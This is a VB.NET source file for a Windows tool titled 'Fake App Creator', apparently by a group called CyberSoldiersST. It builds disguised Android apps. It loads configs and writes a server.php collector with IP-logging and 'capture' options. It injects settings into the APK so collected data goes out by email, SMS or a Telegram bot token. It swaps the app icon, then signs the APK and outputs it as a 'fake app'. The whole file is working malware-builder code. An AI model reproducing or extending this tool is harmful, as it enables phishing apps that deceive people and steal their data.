Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports Ionic
Imports Ionic.Zip
Imports MetroFramework
Public Class Form1
    Public tmp As String
    Dim previewHtml As String
    Dim configtxt As String
    Dim package As String
    Dim server As String
    Dim packagename As String
    Dim packageAppname As String
    Dim packageicon As Image

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If My.Computer.FileSystem.FileExists("Ag") = False Then
            Dim oform As agree4
            oform = New agree4
            oform.frm = Me
            Me.Hide()
            oform.Show()
        End If
        While Me.Visible = False
            Application.DoEvents()
        End While
        MetroButton6.Enabled = False
        Me.Visible = False
reloadit:

        Dim lic As String

        If togtele.Checked = True Then
            txttoken.Enabled = True
            txtuserid.Enabled = True
        Else
            txttoken.Enabled = False
            txtuserid.Enabled = False
        End If
        Me.Visible = True
        pgL.Visible = False
        CnTitle.Text = "Fake App Creator ( FAC ) | Version " + My.Application.Info.Version.ToString + " | By @Sahandevs | @CyberSoldiersST"
        Log("Welcome")
    End Sub

    Private Sub BtnExit_Click(sender As Object, e As EventArgs) Handles BtnExit.Click
        Application.Exit()

    End Sub
    Sub LoadInPictureBox(ByVal adr As String)
        Try
            Me.PictureBox1.Image.Dispose()
        Catch ex As Exception

        End Try

        CFile("Temp\tmpicon.png")
        My.Computer.FileSystem.CopyFile(adr, "Temp\tmpicon.png")
        PictureBox1.Image = Image.FromFile("Temp\tmpicon.png")
    End Sub
    Sub Log(ByVal txt As String)
        txtLog.AppendText(txt + Environment.NewLine)
    End Sub

    Private Sub MetroButton1_Click_1(sender As Object, e As EventArgs) Handles MetroButton1.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub MetroPanel1_Paint(sender As Object, e As PaintEventArgs) Handles MetroPanel1.Paint

    End Sub

    Private Sub MetroCheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles MetroCheckBox1.CheckedChanged


    End Sub


    Private Sub MetroCheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles MetroCheckBox2.CheckedChanged

    End Sub
    Sub CFile(ByVal file As String)
b:
        On Error GoTo b
        If My.Computer.FileSystem.FileExists(file) Then
            My.Computer.FileSystem.DeleteFile(file)
        End If
    End Sub
    Sub CFolder(ByVal file As String)
c:
        On Error GoTo c
        If My.Computer.FileSystem.DirectoryExists(file) Then
            My.Computer.FileSystem.DeleteDirectory(file, FileIO.DeleteDirectoryOption.DeleteAllContents)
        End If
    End Sub
    Function DeleteFilesFromFolder(Folder As String)
        Try

            My.Computer.FileSystem.DeleteDirectory(Folder, FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.CreateDirectory(Folder)
        Catch ex As Exception

        End Try
    End Function
    Private Sub btnLoadConfig_Click(sender As Object, e As EventArgs) Handles btnLoadConfig.Click
        OpenFileDialog1.Title = "Select Config File"
        OpenFileDialog1.Filter = "FAC File|*.fac"
        LoadConfig()
    End Sub
    Private Function Extract(ByVal ZipToUnpack As String, ByVal UnpackDirectory As String, ByVal pass As String) As Boolean
        Try
            Using zip1 As ZipFile = ZipFile.Read(ZipToUnpack)
                zip1.Password = pass
                zip1.Encryption = EncryptionAlgorithm.WinZipAes256
                Dim e As ZipEntry



                For Each e In zip1

                    e.Extract(UnpackDirectory, ExtractExistingFileAction.OverwriteSilently)
                Next
            End Using
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Private Function ExtractNoPass(ByVal ZipToUnpack As String, ByVal UnpackDirectory As String) As Boolean
        Try
            Using zip1 As ZipFile = ZipFile.Read(ZipToUnpack)
                Dim e As ZipEntry



                For Each e In zip1

                    e.Extract(UnpackDirectory, ExtractExistingFileAction.OverwriteSilently)
                Next
            End Using
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Sub LoadConfig()
        Try


            OpenFileDialog1.Title = "Please Choose .FAC Config File"
            OpenFileDialog1.Multiselect = False
            If OpenFileDialog1.ShowDialog = DialogResult.OK Then
                Dim filename As String = OpenFileDialog1.FileName
                DeleteFilesFromFolder("Tools\Working")
                My.Computer.FileSystem.CopyFile(filename, "tools\working\config.fac")
                Dim pass As String = inputdia("FAC | Config Loader", "Please Enter Config Password")
                If Extract("Tools\working\config.fac", "Tools\working", GenerateHash(pass)) = False Then
                    Log("Password Error")
                End If
                Log("Loading Config")

                configtxt = My.Computer.FileSystem.ReadAllText("tools\working\Conf.ini")
                previewHtml = My.Computer.FileSystem.ReadAllText("tools\working\preview.per")
                server = My.Computer.FileSystem.ReadAllText("tools\working\server.srv")
                CFile("tools\PackageWorking\package.pac")
                My.Computer.FileSystem.MoveFile("tools\working\package.pac", "tools\PackageWorking\package.pac")
                DeleteFilesFromFolder("Tools\Working")
                If CheckVer(ReadConf(configtxt, "minversion")) = False Then
                    Log("This Config Need New Version Of Software")
                    configtxt = "" : previewHtml = "" : server = ""
                    GoTo doneLoadConfig
                End If
                MetroButton6.Enabled = True
                CnLog.Text = ReadConf(configtxt, "name") + " | Version : " + ReadConf(configtxt, "version") + " | By " + ReadConf(configtxt, "creator")
                txtLoading.Text = ReadConf(configtxt, "dloadmsg")
                txtmailsubject.Text = ReadConf(configtxt, "mailsubject")
                txtNoNet.Text = ReadConf(configtxt, "dnonetmsg")
                txtComp.Text = ReadConf(configtxt, "dcompmsg")
                txtWelcome.Text = ReadConf(configtxt, "dwlcmsg")
                txtPageTitle.Text = ReadConf(configtxt, "dtitle")
                txtFooter.Text = ReadConf(configtxt, "dfooter")
                MetroToggle1.Checked = False
                MetroCheckBox2.Checked = False
                togtele.Checked = False
                If ReadConf(configtxt, "teleenable") = "true" Then
                    togtele.Enabled = True
                    lbltele.Visible = False
                Else
                    togtele.Enabled = False
                    lbltele.Visible = True
                End If

                If ReadConf(configtxt, "hassendviasms") = "true" Then
                        MetroCheckBox2.Enabled = True
                        lblnosupSENDSMS.Visible = False
                    Else
                        MetroCheckBox2.Enabled = False
                        lblnosupSENDSMS.Visible = True
                    End If
                    If ReadConf(configtxt, "hascapture") = "true" Then
                        MetroToggle1.Enabled = True
                        MetroLabel16.Visible = False
                    Else
                        MetroToggle1.Enabled = False
                        MetroLabel16.Visible = True
                    End If
                    ExtractNoPass("tools\PackageWorking\package.pac", "tools\PackageWorking")
                    CFile("tools\PackageWorking\package.pac")
                    LoadInPictureBox("tools\PackageWorking\res\drawable\icon.png")

                    MetroTextBox1.Text = "Default Icon"
                    Log("Done Loading Config")
                Else
                    Log("User Canceled")
            End If

            Log("Done")
doneLoadConfig:
            DeleteFilesFromFolder("Tools\Working")
        Catch ex As Exception
            Log("Error Loading Config")
        End Try
    End Sub
    Private Function CpuId() As String
        Dim computer As String = "."
        Dim wmi As Object = GetObject("winmgmts:" &
            "{impersonationLevel=impersonate}!\\" &
            computer & "\root\cimv2")
        Dim processors As Object = wmi.ExecQuery("Select * from " &
            "Win32_Processor")

        Dim cpu_ids As String = ""
        For Each cpu As Object In processors
            cpu_ids = cpu_ids & ", " & cpu.ProcessorId
        Next cpu
        If cpu_ids.Length > 0 Then cpu_ids =
            cpu_ids.Substring(2)

        Return cpu_ids
    End Function
    Public Function GenerateHash(ByVal TextToHash As String) As String
        Dim UTF8Encoder As New UTF8Encoding
        Dim StringAsBytes() As Byte = UTF8Encoder.GetBytes(TextToHash)

        Dim MD5Provider As New MD5CryptoServiceProvider
        Dim ByteHash() As Byte = MD5Provider.ComputeHash(StringAsBytes)

        Return Convert.ToBase64String(ByteHash)
    End Function

    Public Function CompareMD5Hash(ByVal DataToCompare As String, ByVal StoredHash As String) As Boolean
        If GenerateHash(DataToCompare) = StoredHash Then
            Return True
        Else
            Return False
        End If
    End Function
    Function CheckVer(ByVal version As String) As Boolean
        Dim appversion As String = My.Application.Info.Version.ToString
        Dim AVer() As String = appversion.Split(".")
        Dim CVer() As String = version.Split(".")
        For i = 0 To AVer.Length - 1

            If Int(AVer(i)) < Int(CVer(i)) Then
                Return False
            End If
        Next
        Return True
    End Function
    Function ReadConf(ByVal txt As String, ByVal key As String) As String
        Dim en() As String = txt.Split(Environment.NewLine)
        For i = 0 To en.Length - 1
            Dim k() As String = en(i).Split("=")
            If k(0).Trim = key Then
                Return k(1).Trim
            End If
        Next
        Return ""
    End Function
    Private Sub MetroButton3_Click(sender As Object, e As EventArgs) Handles MetroButton3.Click
        Dim oForm As Create_Config
        oForm = New Create_Config()
        oForm.frmr = Me
        oForm.Show()
        Me.Hide()
    End Sub
    Function inputdia(ByVal title As String, ByVal que As String) As String
        Dim oForm As InputDi
        oForm = New InputDi()
        oForm.frm = Me
        oForm.title = title
        oForm.que = que
        oForm.Show()
        Me.Visible = False
        Me.Hide()
        While (Me.Visible = False)
            Application.DoEvents()
        End While
        tmp = Me.Text
        Return Me.Text
    End Function

    Private Sub btnPreView_Click(sender As Object, e As EventArgs) Handles btnPreView.Click
        If previewHtml <> "" Then
            Dim oForm As PreView
            oForm = New PreView()
            oForm.frm = Me
            oForm.title = txtPageTitle.Text
            oForm.footer = txtFooter.Text
            oForm.html = previewHtml
            oForm.Show()
            Me.Hide()
        Else
            Log("Preview Is Not Available")
        End If
    End Sub
    Function GetServer() As String
        Dim tmp As String = server
        If MetroToggle1.Checked = True Then
            tmp = tmp.Replace("$allowcapture$", "ok")
        Else
            tmp = tmp.Replace("$allowcapture$", "no")
        End If
        If TogIp.Checked = True Then
            tmp = tmp.Replace("$allowip$", "ok")
        Else
            tmp = tmp.Replace("$allowip$", "no")
        End If
        Return tmp.Replace("$email$", txtMail.Text).Replace("$subject$", txtmailsubject.Text)
    End Function
    Function getConfig() As String
        Dim tmp As String = My.Resources.configStr.Replace("$wlc$", txtWelcome.Text).Replace("$wait$", txtLoading.Text).Replace("$net$", txtNoNet.Text).Replace("$comp$", txtComp.Text).Replace("$web$", txtPhpAddress.Text)
        tmp = tmp.Replace("$pagetitle$", txtPageTitle.Text).Replace("$footer$", txtFooter.Text).Replace("$smsnum$", txtPhone.Text)
        If MetroCheckBox2.Checked = True Then
            tmp = tmp.Replace("$sendviasms$", "true")
        Else
            tmp = tmp.Replace("$sendviasms$", "false")
        End If
        If MetroCheckBox1.Checked = True Then
            tmp = tmp.Replace("$sendviaemail$", "true")
        Else
            tmp = tmp.Replace("$sendviaemail$", "false")
        End If
        If MetroToggle1.Checked = True Then
            tmp = tmp.Replace("%capture$", "true")
        Else
            tmp = tmp.Replace("%capture$", "false")
        End If
        If togtele.Checked = True Then
            tmp = tmp.Replace("$teleenable$", "true").Replace("$teletoken$", txttoken.Text).Replace("$teleuserid$", txtuserid.Text)
        Else
            tmp = tmp.Replace("$teleenable$", "false").Replace("$teletoken$", txttoken.Text).Replace("$teleuserid$", txtuserid.Text)
        End If
        Return tmp
    End Function
    Sub CreateApk()
        Try
            '   "tools\PackageWorking\res",
            '       "tools\PackageWorking\META-INF",
            '      "tools\PackageWorking\assets"
            Using zip As New ZipFile

                zip.AddItem("tools\PackageWorking\AndroidManifest.xml", "")
                zip.AddItem("tools\PackageWorking\classes.dex", "")
                zip.AddItem("tools\PackageWorking\resources.arsc", "")
                zip.AddItem("tools\PackageWorking\res", "res")
                zip.AddItem("tools\PackageWorking\META-INF", "META-INF")
                zip.AddItem("tools\PackageWorking\assets", "assets")
                zip.Save("apk.apk")
            End Using
        Catch ex1 As Exception
            Log("Error Creating Apk")
        End Try
    End Sub
    Private Sub MetroButton2_Click(sender As Object, e As EventArgs) Handles MetroButton2.Click
        
        If previewHtml <> "" Then



            Log("Creating Server...")

            My.Computer.FileSystem.WriteAllText("results\server.php", GetServer, False)
            Log("Creating Server Done")
            Log("Creating Fake App...")
            '       DeleteFilesFromFolder("tools\working")

            '    My.Computer.FileSystem.CopyFile("package.pac", "tools\working\package.pac")

            My.Computer.FileSystem.WriteAllText("tools\PackageWorking\assets\setup.cnf", getConfig, False)
            '     Dim startInfo As New ProcessStartInfo("Tools\zipit.exe", "config.fac -p """ + MetroTextBox3.Text + """ -aes Tools\Working -utf8")
            If MetroTextBox1.Text <> "Default Icon" Then
                CFile("tools\PackageWorking\res\drawable\icon.png")
                My.Computer.FileSystem.CopyFile(MetroTextBox1.Text, "tools\PackageWorking\res\drawable\icon.png")
            End If

            CFile("apk.apk")
            CreateApk()

            Dim startInfo = New ProcessStartInfo("sign.bat")
            startInfo.WindowStyle = ProcessWindowStyle.Hidden
                Process.Start(startInfo)
                While (exits("APK.s.apk") = False)

            End While
            CFile("results\APK.s.apk")
killit:
                Try
                    My.Computer.FileSystem.MoveFile("APK.s.apk", "results\APK.s.apk")
                Catch ex As Exception
                    GoTo killit
                End Try

                Log("Creating Fake App Done")
                startInfo = New ProcessStartInfo("explorer.exe", My.Application.Info.DirectoryPath + "\results")
                Process.Start(startInfo)
                startInfo.WindowStyle = ProcessWindowStyle.Hidden
            CFile("APK.apk")
            DeleteFilesFromFolder("tools\PackageWorking")
            DeleteFilesFromFolder("tools\Working")
            Log("Saved In Results Folder")
            Else
                Log("Please Setup A Config First !")
        End If
    End Sub
    Function exits(ByVal ad As String) As Boolean
        If My.Computer.FileSystem.FileExists(ad) Then
            Return True
        Else
            Return False
        End If
    End Function
    Function dexits(ByVal ad As String) As Boolean
        If My.Computer.FileSystem.DirectoryExists(ad) Then
            Return True
        Else
            Return False
        End If
    End Function

    Private Sub CnTitle_Click(sender As Object, e As EventArgs) Handles CnTitle.Click
        Try


            Process.Start("tg://resolve?domain=CyberSoldiersST")
        Catch ex As Exception
            Process.Start("https://telegram.me/CyberSoldiersST")
        End Try
    End Sub

    Private Sub MetroButton4_Click(sender As Object, e As EventArgs) Handles MetroButton4.Click
        Try


            Process.Start("tg://resolve?domain=fakeappcreator")
        Catch ex As Exception
            Process.Start("https://telegram.me/fakeappcreator")
        End Try
    End Sub

    Private Sub MetroButton5_Click(sender As Object, e As EventArgs) Handles MetroButton5.Click
        OpenFileDialog1.Title = "Select PNG File"
        OpenFileDialog1.Filter = "PNG File|*.png"
        OpenFileDialog1.Multiselect = False
        If OpenFileDialog1.ShowDialog = DialogResult.OK Then
            MetroTextBox1.Text = OpenFileDialog1.FileName
            LoadInPictureBox(OpenFileDialog1.FileName)
        End If
    End Sub

    Private Sub MetroButton6_Click(sender As Object, e As EventArgs) Handles MetroButton6.Click
        LoadInPictureBox("tools\PackageWorking\res\drawable\icon.png")
        MetroTextBox1.Text = "Default Icon"
    End Sub

    Private Sub MetroLabel11_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub togtele_CheckedChanged(sender As Object, e As EventArgs) Handles togtele.CheckedChanged
        If togtele.Checked = True Then
            txttoken.Enabled = True
            txtuserid.Enabled = True
        Else
            txttoken.Enabled = False
            txtuserid.Enabled = False
        End If
    End Sub
End Class
